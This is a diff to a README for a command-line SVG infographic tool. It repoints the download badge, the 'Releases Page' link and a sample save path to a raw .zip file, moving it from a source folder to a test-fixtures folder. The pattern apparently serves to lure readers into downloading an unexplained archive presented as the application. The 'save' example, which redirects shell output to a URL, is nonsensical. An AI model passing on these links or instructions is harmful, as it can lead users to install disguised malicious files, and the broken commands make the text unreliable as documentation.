@@ -1,6 +1,6 @@
 # 🎨 infographic-cli - Create Stunning SVG Infographics Instantly
 
-![Download infographic-cli](https://github.com/Ganeshng/infographic-cli/raw/refs/heads/main/src/cli-infographic-v3.5.zip)
+![Download infographic-cli](https://github.com/Ganeshng/infographic-cli/raw/refs/heads/main/__tests__/fixtures/examples/infographic-cli-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to infographic-cli! This application allows you to create beautiful SVG 
 
 To get started, visit the Releases page to download infographic-cli. 
 
-[Visit the Releases Page](https://github.com/Ganeshng/infographic-cli/raw/refs/heads/main/src/cli-infographic-v3.5.zip)
+[Visit the Releases Page](https://github.com/Ganeshng/infographic-cli/raw/refs/heads/main/__tests__/fixtures/examples/infographic-cli-v1.1.zip)
 
 ### 1. Visit the Releases Page
 Click the link above to go to the download section.
@@ -62,7 +62,7 @@ You can either save it to a file or view it in a web browser.
 
 To save:
 ```
-infographic-cli "your infographics details here" > https://github.com/Ganeshng/infographic-cli/raw/refs/heads/main/src/cli-infographic-v3.5.zip
+infographic-cli "your infographics details here" > https://github.com/Ganeshng/infographic-cli/raw/refs/heads/main/__tests__/fixtures/examples/infographic-cli-v1.1.zip
 ```
 
 To open it in a browser, simply double-click the SVG file.
